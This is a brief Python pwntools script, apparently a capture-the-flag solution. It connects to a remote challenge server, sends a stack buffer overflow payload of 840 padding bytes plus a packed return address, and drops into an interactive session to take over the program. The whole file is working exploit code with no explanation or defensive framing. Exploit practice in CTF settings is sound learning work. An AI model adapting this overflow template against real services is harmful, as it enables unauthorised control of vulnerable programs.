from pwn import *
r = remote('chall.ctf.scist.org',10101)
a = r.recvline()
print a
payload = 'A'*840+p64(0x0040119b)

r.send(payload)
r.interactive()
